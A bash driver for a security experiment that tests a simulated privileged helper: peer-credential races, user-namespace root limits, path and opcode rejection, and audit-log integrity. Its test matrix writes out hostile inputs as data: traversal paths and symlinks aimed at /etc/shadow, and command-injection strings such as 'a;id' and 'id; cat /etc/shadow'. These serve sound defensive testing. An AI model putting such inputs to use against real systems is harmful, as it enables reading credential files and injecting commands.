#!/usr/bin/env bash
# Experiment 0-G driver — privilege model and simulated privileged helper.
#
# Deterministic and repeatable. Every number in REPORT.md is produced here.
# Exits non-zero if any hard assertion fails.
#
# NO REAL PRIVILEGE IS USED. Every "root" test runs inside `unshare`; every
# second-uid test uses /etc/subuid via newuidmap. Nothing outside
# experiments/00-g-privilege/ and /tmp/li-phase0-0g-* is written.
set -euo pipefail

EXP_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RAW="$EXP_DIR/results"
BIN="$EXP_DIR/target/release"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
SCRATCH="$(mktemp -d /tmp/li-phase0-0g-XXXXXX)"
QUICK="${QUICK:-0}"
HELPER_PID=""
HELPER_REAL_PID=""

mkdir -p "$RAW"
trap 'stop_helper; sweep' EXIT

FAIL=0
log() { printf '\n== %s\n' "$*" >&2; }
ok() { printf 'PASS  %s\n' "$*"; }
bad() { printf 'FAIL  %s\n' "$*"; FAIL=$((FAIL + 1)); }
note() { printf 'NOTE  %s\n' "$*"; }

sweep() {
  # Only our own scratch tree, matched by the exact mktemp path. `-delete`
  # implies `-depth`, so files go before their parents and sockets/symlinks are
  # removed too (the earlier version only deleted regular files, so a run with
  # a leftover .sock never cleaned up).
  [ -n "${SCRATCH:-}" ] || return 0
  case "$SCRATCH" in
    /tmp/li-phase0-0g-??????) ;;
    *) return 0 ;;
  esac
  if [ -d "$SCRATCH" ]; then
    find "$SCRATCH" -mindepth 1 -delete 2>/dev/null || true
    rmdir "$SCRATCH" 2>/dev/null || true
  fi
  # T2(d) uses a fixed mountpoint because it must be visible to the namespace
  # it creates; it is empty by then (the tmpfs died with the namespace).
  rmdir /tmp/li-phase0-0g-nsmnt 2>/dev/null || true
}

detect_env() {
  local out="$RAW/00-environment-$STAMP.log"
  {
    echo "# environment for experiment 0-G"
    echo "date_utc=$(date -u +%FT%TZ)"
    echo "kernel=$(uname -r)"
    echo "distro=$(grep -m1 '^NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"')"
    echo "rustc=$(rustc -V)"
    echo "cargo=$(cargo -V)"
    echo "id=$(id)"
    echo "clk_tck=$(getconf CLK_TCK)"
    echo "uid_map_of_shell=$(tr '\n' ';' </proc/self/uid_map)"
    echo "subuid_entry=$(grep "^$(id -un):" /etc/subuid || echo none)"
    for t in newuidmap unshare strace sqlite3 btrfs inotifywait setpriv capsh python3; do
      printf '%s=%s\n' "$t" "$(command -v "$t" || echo MISSING)"
    done
    echo
    echo "## read-only probes of the 'sensitive' targets used below"
    ls -l /etc/shadow 2>&1 | sed 's/^/  /'
    ls -ld /root 2>&1 | sed 's/^/  /'
    echo
    echo "## containment: writes happen only under $EXP_DIR and /tmp/li-phase0-0g-*"
  } >"$out" 2>&1
  echo "environment -> ${out##*/}" >&2
}

build() {
  local out="$RAW/01-build-$STAMP.log"
  {
    echo "## cargo build --release --offline"
    (cd "$EXP_DIR" && cargo build --release --offline 2>&1)
    echo
    echo "## cargo test --release --offline"
    (cd "$EXP_DIR" && cargo test --release --offline 2>&1 | grep -E 'running |test result|^test ')
    echo
    echo "## cargo clippy --release --offline --all-targets -- -D warnings"
    if (cd "$EXP_DIR" && cargo clippy --release --offline --all-targets -- -D warnings 2>&1); then
      echo "clippy=clean"
    else
      echo "clippy=DIRTY"
    fi
    echo
    echo "## cargo fmt --check"
    if (cd "$EXP_DIR" && cargo fmt --check 2>&1); then echo "fmt=clean"; else echo "fmt=DIRTY"; fi
  } >"$out" 2>&1
  if ! (cd "$EXP_DIR" && cargo build --release --offline >/dev/null 2>&1); then
    bad "release build failed; see ${out##*/}"
    exit 1
  fi
  if grep -q 'clippy=clean' "$out" && grep -q 'fmt=clean' "$out"; then
    ok "build, tests, clippy -D warnings and rustfmt all clean"
  else
    bad "build hygiene check failed; see ${out##*/}"
  fi
  echo "build/tests/clippy/fmt -> ${out##*/}" >&2
}

start_helper() {
  local sock="$1" root="$2" audit="$3"
  shift 3
  "$BIN/helper" --socket "$sock" --root "$root" --audit "$audit" "$@" \
    >"${sock%.sock}.helper.out" 2>&1 &
  HELPER_PID=$!
  local i
  for i in $(seq 1 100); do
    [ -S "$sock" ] && return 0
    sleep 0.05
  done
  return 1
}

stop_helper() {
  # HELPER_REAL_PID is set when the helper runs under a wrapper (strace). The
  # wrapper must be told about the helper's death, and the helper must be killed
  # first: killing only the wrapper would leave the helper holding the socket.
  if [ -n "${HELPER_REAL_PID:-}" ]; then
    kill "$HELPER_REAL_PID" 2>/dev/null || true
    HELPER_REAL_PID=""
  fi
  if [ -n "${HELPER_PID:-}" ]; then
    kill "$HELPER_PID" 2>/dev/null || true
    local n=0
    while kill -0 "$HELPER_PID" 2>/dev/null && [ "$n" -lt 20 ]; do
      sleep 0.05
      n=$((n + 1))
    done
    if kill -0 "$HELPER_PID" 2>/dev/null; then
      kill -9 "$HELPER_PID" 2>/dev/null || true
    fi
    wait "$HELPER_PID" 2>/dev/null || true
    HELPER_PID=""
  fi
}

# ---------------------------------------------------------------------------
# T1. SO_PEERCRED TOCTOU, pid reuse, and (pid,starttime) as an identity key
# ---------------------------------------------------------------------------
t1_peercred() {
  local out="$RAW/T1-peercred-$STAMP.log"
  {
    echo "# T1a — the client connects and _exit(0)s immediately, sending no bytes."
    echo "# The server sleeps 1000 ms and only THEN calls getsockopt(SO_PEERCRED)."
    echo "# Questions: is the reported pid still ours? gone? already someone else's?"
    echo "\\$ credprobe toctou --socket S --delay-ms 1000"
    echo
  } >"$out"
  "$BIN/credprobe" toctou --socket "$SCRATCH/t1.sock" --delay-ms 1000 2>&1 | tee -a "$out"

  {
    echo
    echo "# T1b — the server forces a BRAND NEW process onto the dead client's pid"
    echo "# via ns_last_pid, which needs a private pid namespace. This is the"
    echo "# adversarial case: pid reused while the socket is still open."
    echo "\\$ unshare -Urpf --mount-proc credprobe toctou --impostor"
    echo
  } >>"$out"
  unshare -Urpf --mount-proc "$BIN/credprobe" toctou \
    --socket "$SCRATCH/t1b.sock" --delay-ms 1000 --impostor 2>&1 | tee -a "$out"

  {
    echo
    echo "# T1c — is (pid,starttime) a unique process identity? starttime has"
    echo "# CLK_TCK granularity, so two distinct processes created inside one tick"
    echo "# would share both fields. Forced reuse makes this deterministic."
    echo "\\$ unshare -Urpf --mount-proc credprobe same-tick --pid 4242 --trials 20"
    echo
  } >>"$out"
  unshare -Urpf --mount-proc "$BIN/credprobe" same-tick --pid 4242 --trials 20 2>&1 \
    | tee -a "$out"

  grep -q '"cred_is_frozen":true' "$out" \
    && ok "T1 SO_PEERCRED is a frozen snapshot, not a live lookup" \
    || bad "T1 expected cred_is_frozen:true"
  grep -q '"liveness_after_reap":"gone"' "$out" \
    && ok "T1 after the server reaps the child the pid is gone while the socket stays open" \
    || bad "T1 expected the pid to be gone after reap"
  grep -q '"naive_pid_only_identity_confusion":true' "$out" \
    && ok "T1 pid reused by a different process: pid-only identity is confusable" \
    || bad "T1 impostor did not take over the pid"
  grep -q 'pid_starttime_is_not_a_unique_key_within_one_tick' "$out" \
    && ok "T1 (pid,starttime) collides within one tick — H2 falsified as predicted" \
    || note "T1 no same-tick collision observed this run"
}

# ---------------------------------------------------------------------------
# T2. What root inside an unprivileged user namespace can actually do
# ---------------------------------------------------------------------------
t2_userns() {
  local out="$RAW/T2-userns-root-$STAMP.log"
  local d="$SCRATCH/t2"
  mkdir -p "$d"

  {
    echo "# T2 — what uid 0 inside \`unshare -Ur\` actually holds."
    echo "# Host uid is $(id -u); inside the namespace uid 0 maps to it."
    echo
    echo "## (a) identity and mapping inside the namespace"
    echo "\\$ unshare -Ur sh -c 'cat /proc/self/uid_map; id'"
  } >"$out"
  unshare -Ur sh -c 'cat /proc/self/uid_map; id' >>"$out" 2>&1 || true

  {
    echo
    echo "## (b) can namespace-root read a host root-only file?"
    echo "\\$ cat /etc/shadow                  # as the host user"
  } >>"$out"
  if cat /etc/shadow >/dev/null 2>&1; then echo "  READ_OK" >>"$out"; else echo "  READ_DENIED (EACCES)" >>"$out"; fi
  {
    echo "\\$ unshare -Ur cat /etc/shadow      # as namespace root"
  } >>"$out"
  if unshare -Ur cat /etc/shadow >/dev/null 2>&1; then
    echo "  READ_OK — THIS WOULD BE A SERIOUS FINDING" >>"$out"
  else
    echo "  READ_DENIED (EACCES)" >>"$out"
  fi

  {
    echo
    echo "## (c) can namespace-root read a file owned by a DIFFERENT uid?"
    echo "# A second uid from /etc/subuid (host 100000) is mapped into a fresh"
    echo "# namespace; it creates a 0600 file, then namespace-root tries to read it."
    echo "# Both processes belong to the same host user, so this isolates kernel"
    echo "# ownership checks from the host user's own rights."
    echo "# Reading the result: namespace root holds CAP_DAC_OVERRIDE, but that"
    echo "# capability only covers inodes whose owner uid is MAPPED into this"
    echo "# namespace. A file owned by mapped uid 5 is therefore readable; a file"
    echo "# owned by host root (unmapped) is not, which is what (b) shows."
  } >>"$out"
  # The mktemp scratch tree is 0700, so uid 5 cannot even enter it. Open this
  # one subdirectory first, otherwise the test measures EACCES on the path
  # instead of ownership on the file (this actually happened; REPORT §6 dev. 4).
  # BOTH levels must be reachable: mktemp makes $SCRATCH 0700, so opening only
  # $d is not enough and the failure looks like a permission denial on the file.
  chmod 0711 "$SCRATCH"
  chmod 0777 "$d"
  unshare --map-users=0:1000:1 --map-users=5:100000:1 \
          --map-groups=0:1000:1 --map-groups=5:100000:1 \
    sh -c "setpriv --reuid=5 --regid=5 --clear-groups sh -c 'printf other-uid >\"$d/other-uid.txt\"; chmod 600 \"$d/other-uid.txt\"'
           printf '  uid0 (ns root) read -> '; if cat \"$d/other-uid.txt\" >/dev/null 2>&1; then echo READ_OK; else echo READ_DENIED; fi
           printf '  uid5 (owner)   read -> '; setpriv --reuid=5 --regid=5 --clear-groups sh -c 'if cat \"$d/other-uid.txt\" >/dev/null 2>&1; then echo READ_OK; else echo READ_DENIED; fi'
           printf '  file host owner    -> '; stat -c 'uid=%u gid=%g mode=%a' \"$d/other-uid.txt\"" \
    >>"$out" 2>&1 || echo "  subuid mapping unavailable" >>"$out"

  {
    echo
    echo "## (d) can namespace-root mount a tmpfs? (expected yes, but namespace-local)"
    echo "\\$ unshare -Urm sh -c 'mount -t tmpfs tmpfs <dir>'"
  } >>"$out"
  unshare -Urm sh -c '
    p=/tmp/li-phase0-0g-nsmnt
    mkdir -p "$p"
    if mount -t tmpfs tmpfs "$p" 2>/dev/null; then
      echo "  MOUNT_OK"
      printf payload >"$p/x" && echo "  write_inside_ns=OK"
      echo "  visible_in_ns=$(ls "$p" | tr "\n" " ")"
      echo "  filesystem=$(stat -f -c %T "$p")"
    else
      echo "  MOUNT_FAILED"
    fi
  ' >>"$out" 2>&1 || echo "  MOUNT_NS_UNAVAILABLE" >>"$out"
  {
    printf '  host_view_after_ns_exit='
    if ls /tmp/li-phase0-0g-nsmnt 2>/dev/null | grep -qx x; then
      echo "STILL_VISIBLE (unexpected)"
    else
      echo "GONE (the mount died with its namespace)"
    fi
  } >>"$out" 2>&1

  {
    echo
    echo "## (e) what does setuid() inside the namespace mean? Only mapped uids work."
    echo "# Measured with a direct setuid() in a forked child. NOT with"
    echo "# \`setpriv --clear-groups\`: inside a user namespace that first calls"
    echo "# setgroups(), which is refused, so the tool fails before setuid is ever"
    echo "# attempted and every uid looks unmapped. That false reading is recorded"
    echo "# as deviation 3 in REPORT §6."
    echo "\\$ unshare -Ur credprobe userns"
  } >>"$out"
  unshare -Ur "$BIN/credprobe" userns 2>&1 | sed 's/^/  /' >>"$out" || true
  {
    echo
    echo "# The same probe with a mount namespace added, so the tmpfs mount is"
    echo "# actually reachable. Without -m the mount syscall returns EPERM."
    echo "\\$ unshare -Urm credprobe userns --mount-point <dir>"
  } >>"$out"
  unshare -Urm "$BIN/credprobe" userns --mount-point "$SCRATCH/t2/mnt" 2>&1 \
    | sed 's/^/  /' >>"$out" || true
  {
    echo
    echo "# Without the mount namespace the same mount is refused, which is the"
    echo "# difference between 'has CAP_SYS_ADMIN' and 'has somewhere to put it':"
    echo "\\$ unshare -Ur credprobe userns --mount-point <dir>   # no -m"
  } >>"$out"
  unshare -Ur "$BIN/credprobe" userns --mount-point "$SCRATCH/t2/mnt2" 2>&1 \
    | sed 's/^/  /' >>"$out" || true
  {
    echo
    echo "# With a second subuid range mapped in, uid 5 becomes assumable and an"
    echo "# unmapped uid (1, 65534) still is not:"
    echo "\\$ unshare --map-users=0:1000:1 --map-users=5:100000:1 ... credprobe userns"
  } >>"$out"
  unshare --map-users=0:1000:1 --map-users=5:100000:1 \
          --map-groups=0:1000:1 --map-groups=5:100000:1 \
    "$BIN/credprobe" userns 2>&1 | sed 's/^/  /' >>"$out" || true

  {
    echo
    echo "## (f) can namespace-root signal a host root process?"
    echo "# Covered by credprobe userns above (kill_pid1). Independent shell check:"
    echo "\\$ unshare -Ur sh -c 'kill -0 1'"
  } >>"$out"
  unshare -Ur sh -c 'if kill -0 1 2>/dev/null; then echo "  SIGNAL_OK (errno 0)"; else echo "  SIGNAL_DENIED errno=$?"; fi' >>"$out" 2>&1

  {
    echo
    echo "## (f2) capabilities inside the namespace (from /proc/self/status)"
    echo "# CapEff is full inside the namespace. That is the trap: these are"
    echo "# capabilities over the NAMESPACE's own resources, not over the host."
  } >>"$out"
  unshare -Ur sh -c 'grep -E "^Cap(Inh|Prm|Eff|Bnd)" /proc/self/status | sed "s/^/  /"' >>"$out" 2>&1

  {
    echo
    echo "## (g) host-side ownership of a file created by namespace-root"
    echo "\\$ unshare -Ur sh -c 'echo x > f'; stat f   # from the host"
  } >>"$out"
  unshare -Ur sh -c "printf from-ns-root >\"$d/created-by-nsroot.txt\"" 2>>"$out" || true
  stat -c '  host_stat: uid=%u gid=%g mode=%a name=%n' "$d/created-by-nsroot.txt" >>"$out" 2>&1 \
    || echo "  host_stat: unavailable" >>"$out"

  {
    echo
    echo "## (h) capability set inside the namespace"
    echo "\\$ unshare -Ur capsh --print | head -6"
  } >>"$out"
  unshare -Ur capsh --print 2>&1 | head -6 | sed 's/^/  /' >>"$out" || true

  {
    echo
    echo "## (i) can namespace-root write to /etc? (must not touch the host)"
    echo "\\$ unshare -Ur sh -c 'touch /etc/li-0g-should-not-exist'"
  } >>"$out"
  if unshare -Ur sh -c 'touch /etc/li-0g-should-not-exist' 2>/dev/null; then
    echo "  WRITE_OK (unexpected)" >>"$out"
    if [ -e /etc/li-0g-should-not-exist ]; then echo "  HOST_FILE_CREATED — CONTAINMENT BROKEN" >>"$out"; else echo "  not visible on host" >>"$out"; fi
  else
    echo "  WRITE_DENIED (EACCES/EROFS as expected)" >>"$out"
  fi
  [ -e /etc/li-0g-should-not-exist ] && bad "T2 wrote to /etc — containment broken"

  grep -q 'READ_DENIED' "$out" \
    && ok "T2 namespace root cannot read host root-only files" \
    || bad "T2 namespace root read /etc/shadow — serious finding"
  grep -q 'MOUNT_OK' "$out" \
    && ok "T2 namespace root can mount tmpfs, but only inside its own mount ns" \
    || note "T2 tmpfs mount unavailable in this environment"
  grep -q 'host_stat: uid=' "$out" && ! grep -q 'host_stat: uid=0 ' "$out" \
    && ok "T2 files created by namespace root are owned by the unprivileged host uid" \
    || bad "T2 unexpected host ownership of a namespace-root file"
  grep -q '"euid_is_zero":true' "$out" \
    && ok "T2 uid 0 inside the namespace is real (euid 0) yet holds no host power" \
    || bad "T2 the namespace did not map uid 0"
  grep -q '"read_root_dir":"DENIED' "$out" \
    && ok "T2 namespace root cannot list /root" \
    || bad "T2 namespace root listed /root"
  if grep -q '"mount_tmpfs":{"entries_visible"' "$out" && grep -q '"mount_tmpfs":"MOUNT_DENIED' "$out"; then
    ok "T2 tmpfs mounts only with a mount namespace; without -m the same call is EPERM"
  else
    note "T2 mount-namespace asymmetry not observed as expected"
  fi
  if grep -q 'uid0 (ns root) read -> READ_OK' "$out" && grep -q '"read_etc_shadow":"DENIED' "$out"; then
    ok "T2 namespace root overrides DAC only for mapped uids, not for host root — the asymmetry that defines the boundary"
  else
    note "T2 DAC-override asymmetry not observed as expected this run"
  fi
}


# ---------------------------------------------------------------------------
# T3. The helper's rejection matrix, plus proof that gates are independent
# ---------------------------------------------------------------------------
t3_rejections() {
  local out="$RAW/T3-helper-rejections-$STAMP.log"
  local root="$SCRATCH/t3root" sock="$SCRATCH/t3.sock" audit="$SCRATCH/t3-audit.jsonl"
  mkdir -p "$root/sub"
  printf 'ordinary file\n' >"$root/probe.txt"
  ln -s /etc/shadow        "$root/link-shadow-abs"
  ln -s ../../etc/shadow   "$root/link-shadow-rel"
  ln -s /root              "$root/link-rootdir"
  ln -s /etc               "$root/link-etc"

  start_helper "$sock" "$root" "$audit" --allow-uid "$(id -u)" || {
    bad "T3 helper did not start"; return
  }

  {
    echo "# T3 — the entire attacker-reachable surface of the helper."
    echo "# root=$root"
    echo "# allow_uid=$(id -u)"
    echo
    echo "## file modes: two independent gates"
    stat -c '  socket mode=%a uid=%u gid=%g' "$sock"
    stat -c '  audit  mode=%a uid=%u gid=%g' "$audit"
    echo
    echo "## T3a  path escapes: lexical traversal and symlink escapes"
    echo "##      both layers must refuse; openat2 also refuses symlinks INSIDE root"
  } >"$out"

  local p
  for p in '../../etc/shadow' '/etc/shadow' '../etc/shadow' 'sub/../../etc/shadow' \
           'link-shadow-abs' 'link-shadow-rel' 'link-rootdir' 'link-etc'; do
    printf '  %-26s -> ' "$p" >>"$out"
    "$BIN/client" send --socket "$sock" --opcode 2 --path "$p" 2>&1 | tail -1 >>"$out"
  done

  {
    echo
    echo "## T3b  shell metacharacters in a path argument"
  } >>"$out"
  for p in 'a;id' 'a|id' 'a&id' '$(id)' '`id`' 'a b' 'a"b' "a'b" 'a>b' '*' 'a\b'; do
    printf '  %-26s -> ' "$p" >>"$out"
    "$BIN/client" send --socket "$sock" --opcode 2 --path "$p" 2>&1 | tail -1 >>"$out"
  done
  printf '  %-26s -> ' 'embedded newline' >>"$out"
  "$BIN/client" rawstr --socket "$sock" --line "$(printf '{"opcode":2,"args":{"path":"a\\nb"}}')" 2>&1 | tail -1 >>"$out"

  {
    echo
    echo "## T3c  opcode confusion"
  } >>"$out"
  local pair
  for pair in '{"opcode":99}|numeric unknown' \
              '{"opcode":"exec","args":{"cmd":"id"}}|string as command name' \
              '{"opcode":-1}|negative' \
              '{"opcode":1.5}|fractional' \
              '{"opcode":90}|recognised but not implemented' \
              '{"opcode":1,"args":{"cmd":"id; cat /etc/shadow"}}|undeclared argument' \
              '{"opcode":2,"args":[]}|args is an array' \
              'not json at all|not JSON'; do
    local req="${pair%%|*}" label="${pair##*|}"
    printf '  %-30s -> ' "$label" >>"$out"
    "$BIN/client" rawstr --socket "$sock" --line "$req" 2>&1 | tail -1 >>"$out"
  done

  {
    echo
    echo "## T3d  oversized frames (cap 64 KiB/frame, discard cap 8 MiB)"
  } >>"$out"
  printf '  %-30s -> ' '128 KiB, terminated' >>"$out"
  "$BIN/client" raw --socket "$sock" --bytes 131072 --newline --timeout-ms 3000 2>&1 | tail -1 >>"$out"
  printf '  %-30s -> ' '2 MiB, terminated' >>"$out"
  "$BIN/client" raw --socket "$sock" --bytes 2097152 --newline --timeout-ms 3000 2>&1 | tail -1 >>"$out"
  printf '  %-30s -> ' '1 MiB, unterminated' >>"$out"
  "$BIN/client" raw --socket "$sock" --bytes 1048576 --timeout-ms 1500 2>&1 | tail -1 >>"$out"
  printf '  %-30s -> ' 'fresh connection works' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 1 2>&1 | tail -1 >>"$out"

  {
    echo
    echo "## T3e  oversized argument (5000 bytes > MAX_ARG_BYTES=4096)"
  } >>"$out"
  printf '  %-30s -> ' 'path of 5000 x "a"' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 2 \
    --path "$(head -c 5000 /dev/zero | tr '\0' 'a')" 2>&1 | tail -1 >>"$out"

  {
    echo
    echo "## T3f  controls: legitimate requests still work"
  } >>"$out"
  printf '  %-30s -> ' 'StatPath probe.txt' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 2 --path probe.txt 2>&1 | tail -1 >>"$out"
  printf '  %-30s -> ' 'ReadSmall probe.txt' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 3 --path probe.txt 2>&1 | tail -1 >>"$out"
  printf '  %-30s -> ' 'ListDir .' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 4 --path . 2>&1 | tail -1 >>"$out"

  stop_helper

  {
    echo
    echo "## audit log after the matrix"
    echo "  audit_lines=$(wc -l <"$audit")"
    echo "  by_code:"
    grep -o '"code":"[a-z_]*"' "$audit" | sed 's/.*:"//;s/"//' | sort | uniq -c \
      | sed 's/^/    /' || echo "    (none)"
    echo "  by_type:"
    grep -o '"type":"[A-Za-z]*"' "$audit" | sed 's/.*:"//;s/"//' | sort | uniq -c \
      | sed 's/^/    /' || echo "    (none)"
  } >>"$out"

  local escapes served
  escapes="$(grep -c 'path_escape' "$out" || true)"
  served="$(grep -cE '^  (\.\.|/etc|link-)[^ ]* +-> \{"ok":true' "$out" || true)"
  [ "${escapes:-0}" -ge 8 ] \
    && ok "T3 all 8 traversal/symlink escape attempts refused (path_escape)" \
    || bad "T3 only ${escapes:-0} path_escape refusals, expected >= 8"
  [ "${served:-0}" -eq 0 ] \
    && ok "T3 no escape request was served" \
    || bad "T3 $served escape request(s) were SERVED"
  grep -q 'frame_too_large' "$out" \
    && ok "T3 oversized frames refused with frame_too_large" \
    || bad "T3 oversized frames were not refused"
  grep -q 'arg_unexpected' "$out" \
    && ok "T3 undeclared argument keys refused (strict argument allowlist)" \
    || bad "T3 undeclared arguments were accepted"
  grep -q 'unknown_opcode' "$out" && grep -q 'bad_opcode' "$out" \
    && ok "T3 unknown and ill-typed opcodes refused" \
    || bad "T3 opcode validation incomplete"
  grep -q 'not_implemented_by_design' "$out" \
    && ok "T3 opcode 90 is classified as refused-by-design, not silently unknown"
}

t3b_unauthorized_uid() {
  local out="$RAW/T3b-unauthorized-uid-$STAMP.log"
  local base="$SCRATCH/t3b" root="$SCRATCH/t3b/root"
  local sock="$SCRATCH/t3b/h.sock"
  mkdir -p "$root"
  chmod 0777 "$base"

  {
    echo "# T3b — a uid missing from the allowlist must be refused."
    echo "# The two gates are measured separately, because reporting the filesystem"
    echo "# gate as if it were the allowlist is how this experiment first misled"
    echo "# itself (see REPORT §6, deviation 2)."
    echo "#   gate 1 (kernel): socket mode 0600 + parent directory mode"
    echo "#   gate 2 (helper): SO_PEERCRED uid vs --allow-uid"
    echo
    echo "## case 1: defaults (parent 0700, socket 0600)"
  } >"$out"
  unshare --map-users=0:1000:1 --map-users=5:100000:1 \
          --map-groups=0:1000:1 --map-groups=5:100000:1 \
    sh -c "
      '$BIN/helper' --socket '$sock' --root '$root' --audit '$base/a1.jsonl' --allow-uid 0 >'$base/h1.out' 2>&1 &
      HP=\$!
      for i in \$(seq 1 100); do [ -S '$sock' ] && break; sleep 0.05; done
      stat -c '  socket mode=%a uid=%u' '$sock'
      printf '  uid5 connect -> '
      setpriv --reuid=5 --regid=5 --clear-groups python3 -c '
import socket,sys
s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
try: s.connect(sys.argv[1]); print(\"CONNECT_OK\")
except OSError as e: print(\"REFUSED_BY_KERNEL errno=%d %s\" % (e.errno, e.strerror))
' '$sock'
      kill \$HP 2>/dev/null; wait \$HP 2>/dev/null
    " >>"$out" 2>&1 || true

  {
    echo
    echo "## case 2: parent 0777 and socket 0666, so gate 1 is wide open."
    echo "#          Any refusal now must come from SO_PEERCRED."
  } >>"$out"
  # The scratch tree is mktemp's 0700, so uid 5 cannot even traverse into it.
  # Open the parents first, otherwise gate 2 is never reached and the test
  # silently measures gate 1 twice (this actually happened; see REPORT §6).
  chmod 0711 "$SCRATCH" "$base" 2>/dev/null || true
  unshare --map-users=0:1000:1 --map-users=5:100000:1 \
          --map-groups=0:1000:1 --map-groups=5:100000:1 \
    sh -c "
      '$BIN/helper' --socket '$sock' --root '$root' --audit '$base/a2.jsonl' --allow-uid 0 --socket-dir-mode 0777 >'$base/h2.out' 2>&1 &
      HP=\$!
      for i in \$(seq 1 100); do [ -S '$sock' ] && break; sleep 0.05; done
      chmod 666 '$sock'
      stat -c '  socket mode=%a uid=%u' '$sock'
      printf '  uid5 connect -> '
      setpriv --reuid=5 --regid=5 --clear-groups python3 -c '
import socket,sys
s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3)
try:
    s.connect(sys.argv[1]); print(\"CONNECT_OK\")
    print(\"  response: \" + s.recv(400).decode().strip())
except OSError as e:
    print(\"REFUSED errno=%d %s\" % (e.errno, e.strerror))
' '$sock'
      printf '  allowed uid0 -> '
      python3 -c '
import socket,sys
s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3)
s.connect(sys.argv[1]); s.sendall(b\"{\\\"opcode\\\":1}\\n\")
print(s.recv(400).decode().strip())
' '$sock'
      kill \$HP 2>/dev/null; wait \$HP 2>/dev/null
    " >>"$out" 2>&1 || true

  {
    echo
    echo "## audit records for the refused connection (case 2)"
    grep -E 'ConnectionRejected' "$base/a2.jsonl" 2>/dev/null | head -2 | sed 's/^/  /' \
      || echo "  (none)"
  } >>"$out"

  grep -q 'REFUSED_BY_KERNEL' "$out" \
    && ok "T3b gate 1: a 0600 socket in a 0700 directory blocks uid 5 in the kernel" \
    || note "T3b gate 1 did not trigger"
  grep -q '"code":"not_authorized"' "$out" \
    && ok "T3b gate 2: SO_PEERCRED allowlist refuses uid 5 even on a world-writable socket" \
    || bad "T3b the allowlist did not produce not_authorized"
}

# ---------------------------------------------------------------------------
# T4. Audit log: concurrency, ordering, completeness, permissions
# ---------------------------------------------------------------------------
t4_audit() {
  local out="$RAW/T4-audit-concurrency-$STAMP.log"
  local root="$SCRATCH/t4root" sock="$SCRATCH/t4.sock" audit="$SCRATCH/t4-audit.jsonl"
  mkdir -p "$root"
  printf 'x\n' >"$root/probe.txt"
  local clients=100 reqs=20
  [ "$QUICK" -eq 1 ] && reqs=5

  start_helper "$sock" "$root" "$audit" --allow-uid "$(id -u)" || {
    bad "T4 helper did not start"; return
  }

  {
    echo "# T4 — ${clients} concurrent clients x ${reqs} requests each, one shared"
    echo "# append-only audit file. Invariants:"
    echo "#   A1 audit lines            == requests + 2 lifecycle records"
    echo "#   A2 sequence numbers       exactly 1..N, no gap, no duplicate"
    echo "#   A3 sequence order        == file order (O_APPEND + one locked write)"
    echo "#   A4 every line             is a complete, parseable JSON object"
    echo "#   A5 file mode              is 0600"
    echo
  } >"$out"
  "$BIN/client" storm --socket "$sock" --clients "$clients" --requests "$reqs" 2>&1 \
    | tee -a "$out"
  stop_helper
  sleep 0.3

  {
    echo
    echo "audit_lines=$(wc -l <"$audit")"
    echo "request_served_records=$(grep -c '"type":"RequestServed"' "$audit" || true)"
    echo "requests_sent=$((clients * reqs))"
    echo "file_mode=$(stat -c '%a' "$audit")"
    echo "file_uid=$(stat -c '%u' "$audit")"
    echo "parent_dir_mode=$(stat -c '%a' "$(dirname "$audit")")"
    echo
    echo "## A2/A4: sequence density and JSON validity"
  } >>"$out"
  python3 - "$audit" >>"$out" 2>&1 <<'PY'
import json, sys
path = sys.argv[1]
seqs, bad, types = [], 0, {}
with open(path, "rb") as f:
    for raw in f:
        try:
            o = json.loads(raw)
        except Exception:
            bad += 1
            continue
        types[o.get("type")] = types.get(o.get("type"), 0) + 1
        s = o.get("sequence")
        if isinstance(s, int):
            seqs.append(s)
        else:
            bad += 1
print(f"parsed_records={len(seqs)} malformed_lines={bad}")
if seqs:
    print(f"sequence_min={min(seqs)} sequence_max={max(seqs)} count={len(seqs)}")
    print(f"sequence_dense_and_in_file_order={seqs == list(range(1, len(seqs) + 1))}")
    print(f"sequence_duplicates={len(seqs) - len(set(seqs))}")
print("types=" + json.dumps(types, sort_keys=True))
PY

  local served mode
  served="$(grep -o 'request_served_records=[0-9]*' "$out" | head -1 | cut -d= -f2)"
  mode="$(grep -oE '^file_mode=[0-9]+' "$out" | head -1 | cut -d= -f2)"
  if grep -q 'sequence_dense_and_in_file_order=True' "$out"; then
    ok "T4 sequence numbers are dense and in file order under 100-way concurrency"
  else
    bad "T4 sequence ordering invariant violated"
  fi
  [ "$mode" = "600" ] \
    && ok "T4 audit file mode is 0600" \
    || bad "T4 audit file mode is ${mode:-unknown}, expected 600"
  grep -q 'malformed_lines=0' "$out" \
    && ok "T4 no malformed or interleaved audit lines" \
    || bad "T4 malformed audit lines present"
  [ "${served:-0}" = "$((clients * reqs))" ] \
    && ok "T4 all $((clients * reqs)) requests produced exactly one audit record" \
    || bad "T4 counted ${served:-0} RequestServed records, expected $((clients * reqs))"
}

# ---------------------------------------------------------------------------
# T5. Minimal privilege inventory
# ---------------------------------------------------------------------------
t5_inventory() {
  local out="$RAW/T5-capability-inventory-$STAMP.log"
  local base="$SCRATCH/t5"
  mkdir -p "$base/watch" "$base/db" "$base/mnt"
  local me; me="$(id -u)"
  : >"$out"

  row() { printf '  %-46s %s\n' "$1" "$2" >>"$out"; }
  trial() { # label, command...
    local label="$1"; shift
    if "$@" >/dev/null 2>&1; then row "$label" "ALLOWED  (unprivileged)"; else row "$label" "DENIED   (needs privilege)"; fi
  }

  {
    echo "# T5 — capability inventory as a plain user (uid $me)."
    echo "# Every row is a command that was actually run; the right column is what"
    echo "# happened, not what the documentation claims."
    echo
    echo "## A. expected to work unprivileged"
  } >>"$out"

  trial "read /proc/self/stat"                         cat /proc/self/stat
  trial "read /proc/self/status"                       cat /proc/self/status
  trial "list /proc for all pids"                      ls /proc
  trial "read another uid's /proc/1/stat (partial ok)" cat /proc/1/stat
  trial "read /proc/1/cmdline (root, same-ns)"         cat /proc/1/cmdline

